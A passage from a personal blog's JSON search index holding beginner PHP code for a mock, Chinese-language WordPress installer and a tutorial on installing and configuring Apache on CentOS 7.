name=&quot;submit&quot;&gt;提交&lt;/button&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; EOF; echo $step1; } //第五步 function successful(){ $step1 = &lt;&lt;&lt;EOF &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;style&gt; &lt;/style&gt; &lt;body style=&quot;text-align: center;&quot;&gt; &lt;form action=&quot;anzhuang.php&quot; method=&quot;post&quot;&gt; &lt;h1&gt;欢迎&lt;/h1&gt; &lt;p&gt;欢迎使用著名的wordpress&lt;/p&gt; &lt;h1&gt;需要信息&lt;/h1&gt; &lt;p&gt;您需要填写一些基本信息&lt;/p&gt; &lt;p&gt;站点标题&lt;input type=&quot;text&quot;&gt;&lt;/p&gt; &lt;p&gt;用户名&lt;input type=&quot;text&quot; name=&quot;uname&quot; value=&quot;&quot;&gt;&lt;/p&gt; &lt;p&gt;密码&lt;input type=&quot;text&quot; name=&quot;upasswd&quot; value=&quot;&quot;&gt;&lt;/p&gt; &lt;p&gt;您的电子邮件&lt;input type=&quot;text&quot;&gt;&lt;/p&gt; &lt;p&gt;对搜索引擎的可见性&lt;input type=&quot;text&quot;&gt;&lt;/p&gt; &lt;button type=&quot;submit&quot; name=&quot;step&quot; value=&quot;6&quot;&gt;安装WordPress&lt;/button&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; EOF; echo $step1; } //第六步--&gt;设置自己登录所需要的用户名密码 function success(){ global $uname; global $upasswd; $step1 = &lt;&lt;&lt;EOF &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;style&gt; &lt;/style&gt; &lt;body style=&quot;text-align: center;&quot;&gt; &lt;form action=&quot;anzhuang.php&quot; method=&quot;post&quot;&gt; &lt;h1&gt;成功&lt;/h1&gt; &lt;p&gt;WordPress安装完成。谢谢！&lt;/p&gt; EOF; $step2 = &lt;&lt;&lt;EOF &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; EOF; //&lt;button type=&quot;submit&quot; name=&quot;step&quot; value=&quot;7&quot;&gt;登录&lt;/button&gt; echo $step1.&apos;&lt;p&gt;用户名：&apos;.$uname.&apos;&lt;/p&gt;&apos;.&apos;&lt;p&gt;密码：&apos;.$upasswd.&apos;&lt;/p&gt;&apos;.$step2; } //登陆界面 /*function wordpress(){ $step1 = &lt;&lt;&lt;EOF &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;style&gt; &lt;/style&gt; &lt;body style=&quot;text-align: center;&quot;&gt; &lt;form action=&quot;anzhuang.php&quot; method=&quot;post&quot;&gt; &lt;h1&gt;欢迎&lt;/h1&gt; &lt;p&gt;欢迎使用著名的wordpress&lt;/p&gt; &lt;p&gt;用户名&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;&quot;&gt;&lt;/p&gt; &lt;p&gt;密码&lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;&gt;&lt;/p&gt; &lt;button type=&quot;submit&quot; name=&quot;step&quot; value=&quot;&quot;&gt;登陆&lt;/button&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; EOF; echo $step1; }*/ ?&gt; jiaoyan.php&lt;?php /** * Created by PhpStorm. * User: Administrator * Date: 2018/12/16 * Time: 15:45 */ @$step = $_POST[&apos;step&apos;]; @$_POST[&apos;sqlname&apos;]; @$_POST[&apos;username&apos;]; @$_POST[&apos;passwd&apos;]; @$_POST[&apos;sqlhost&apos;]; @$_POST[&apos;tbname&apos;]; if (@$_POST[&apos;sqlname&apos;] == &quot;wordpress&quot; &amp;&amp; @$_POST[&apos;username&apos;] == &quot;root&quot; &amp;&amp; @$_POST[&apos;passwd&apos;] == &quot;root&quot; &amp;&amp; @$_POST[&apos;sqlhost&apos;] == &quot;localhost&quot; &amp;&amp; @$_POST[&apos;tbname&apos;] == &quot;wp_&quot;){ errorwpconfig(); }elseif(@$_POST[&apos;sqlname&apos;] != &quot;wordpress&quot; || @$_POST[&apos;username&apos;] != &quot;root&quot; || @$_POST[&apos;passwd&apos;] != &quot;root&quot; || @$_POST[&apos;sqlhost&apos;] != &quot;localhost&quot; || @$_POST[&apos;tbname&apos;] != &quot;wp_&quot;){ errorsql(); } //第四步 function errorwpconfig(){ $step1 = &lt;&lt;&lt;EOF &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;style&gt; &lt;/style&gt; &lt;body style=&quot;text-align: center;&quot;&gt; &lt;form action=&quot;anzhuang.php&quot; method=&quot;post&quot;&gt; &lt;p&gt;抱歉，我不能写入wp-config.php文件&lt;/p&gt; &lt;p&gt;您可以手工创建wp-config.php文件，将下列文字粘贴于其中&lt;/p&gt; &lt;textarea style=&quot;height: 50%;width: 50%;&quot;&gt;sdwaasdwaasdwaasdw&lt;/textarea&gt; &lt;p&gt;在您做完这些之后，点击现在安装&lt;/p&gt; &lt;button type=&quot;submit&quot; name=&quot;step&quot; value=&quot;5&quot;&gt;现在安装&lt;/button&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; EOF; echo $step1; } //数据库信息错误 function errorsql(){ $step1 = &lt;&lt;&lt;EOF &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;style&gt; &lt;/style&gt; &lt;body style=&quot;text-align: center;&quot;&gt; &lt;form action=&quot;anzhuang.php&quot; method=&quot;post&quot;&gt; &lt;p&gt;1.xxxxx出错&lt;/p&gt; &lt;p&gt;2.xxxxx出错&lt;/p&gt; &lt;p&gt;3.xxxxx出错&lt;/p&gt; &lt;button type=&quot;submit&quot; name=&quot;step&quot; value=&quot;3&quot;&gt;返回上一步&lt;/button&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; EOF; echo $step1; } ?&gt;","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://jaychouzzk.github.io/tags/PHP/"}]},{"title":"在Cent os 7下Apache安装","slug":"CentOs7安装Apache服务","date":"2018-12-03T08:00:45.000Z","updated":"2018-12-05T12:21:35.642Z","comments":true,"path":"2018/12/03/CentOs7安装Apache服务/","link":"","permalink":"https://jaychouzzk.github.io/2018/12/03/CentOs7安装Apache服务/","excerpt":"","text":"在Cent os 7下Apache安装 使用软件：Vmware 14，Termius，FileZilla Client 安装环境：CentOs Linux release 7.2.1511 安装Apache版本：httpd-2.4.37 源码安装步骤：将httpd-2.4.37.tar通过sftp上传到cent os的/root目录下 进入Termius中，通过SSH连接虚拟机 将这四个文件传到虚拟机的/root目录下 先将gcc环境安装好 yum install gcc 进入命令行模式，解压这四个文件,解压到默认目录下 tar zxvf apr-1.6.5.tar.gz tar zxvf apr-util-1.6.1.tar.gz tar zxvf pcre-8.42.tar.gz tar zxvf pcre-8.42.tar.gz 1.先安装apr-1.6.5 cd apr-1.6.5/ ./configure --prefix=/usr/local/apr/ make &amp;&amp; make install 如果遇到这个错误，请看下面错误解决 2.安装apr-util-1.6.1 cd apr-util-1.6.1/ ./configure --prefix=/usr/local/apr-util/ --with-apr=/usr/local/apr/ make &amp;&amp; make install 如果遇到了以下错误，请看下面错误解决 3.安装pcre-8.42 cd pcre-8.42 ./configure make &amp;&amp; make install 如果出现以下错误，请看错误解决 4.安装httpd-2.4.37 cd httpd-2.4.37 ./configure --prefix=/usr/local/apache2 make &amp;&amp; make install 如果遇到以下错误，请看错误解决 安装完成 启动命令： /usr/local/apache2/bin/apachectl start 缺少gcc的组件，执行命令 yum -y install gcc gcc-c++ pcre-devel 即可成功然后进入 /usr/local/apache2/bin/apachectl start 即可运行apache服务如果出现 服务也是开启的，只是一个告警，提示没有设置servername 解决办法：可以在配置文件中配置 /usr/local/apache2/conf/httpd.conf 成功运行 使用命令行安装Apacheyum install httpd systemctl start httpd systemctl enable httpd firewall -cmd --add-service=http --permanent firewall-cmd --reload vim /var/www/html/index.html //写入hello word 关闭防火墙 systemctl stop firewalld service iptables stop 在物理机中访问 成功配置完毕附加一些配置命令： rm -f /etc/httpd/conf.d/welcome.conf #删除默认欢迎页面 vi /etc/httpd/conf/httpd.conf #自己配置环境 # line 86: 改变管理员的邮箱地址 ServerAdmin root@linuxprobe.org # line 95: 改变域名信息 ServerName www.linuxprobe.org:80 # line 151: none变成All AllowOverride All # line 164: 添加只能使用目录名称访问的文件名 DirectoryIndex index.html index.cgi index.php # add follows to the end # server&apos;s response header（安全性） ServerTokens Prod # keepalive is ON KeepAlive On 错误解决 安装apr-1.6.5出现的错误错误： cannot remove ‘libtoolT’：no such file or directory 解决： vim /root/apr-1.6.5/cofigure 将RM=&quot;$RM&quot; 改为RM=&quot;$RM -f&quot; RM=&quot;rm&quot; 改为RM=&quot;$rm -f&quot; 安装apr-util.1.6.1出现的错误错误1: configure: error: APR could not be located. Please use the --with-apr option. 解决： ./configure --with-apr 或：./configure --prefix=/usr/local/apr-util/ --with-apr=/usr/local/apr/ 错误2： checking for APR... configure: error: the --with-apr parameter is incorrect. It must specify an install prefix, a build directory, or an apr-config file 解决： ./configure --prefix=/usr/local/apr --with-apr=/usr/local/apr/ 错误3： make[1]: 进入目录“/usr/local/apr-util-1.6.1” /bin/sh /usr/local/apr/build-1/libtool --silent --mode=compile gcc -g -O2 -pthread -DHAVE_CONFIG_H -D_REENTRANT -D_GNU_SOURCE -I/usr/local/apr-util-1.6.1/include -I/usr/local/apr-util-1.6.1/include/private -I/usr/local/apr/include/apr-1 -o xml/apr_xml.lo -c xml/apr_xml.c &amp;&amp; touch xml/apr_xml.lo xml/apr_xml.c:35:19: 致命错误：expat.h：没有那个文件或目录 #include &lt;expat.h&gt; 编译中断。 make[1]: *** [xml/apr_xml.lo] 错误 1 make[1]: 离开目录“/usr/local/apr-util-1.6.1” make: *** [all-recursive] 错误 1 解决方法： yum install expat-devel 安装proc错误出现的错误错误： configure: error: Invalid C++ compiler or C++ compiler flags 解决方法： yum -y install gcc gcc-c++ pcre-devel 安装httpd出现的错误错误： checking for APR-util... no configure: error: APR-util not found. Please read the documentation. 解决方法： ./configure --prefix=/usr/local/apache2 --with-apr-util=/usr/local/apr-util/","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://jaychouzzk.github.io/tags/Linux/"},{"name":"Apache，CentOs","slug":"Apache，CentOs","permalink":"https://jaychouzzk.github.io/tags/Apache，CentOs/"}]}]}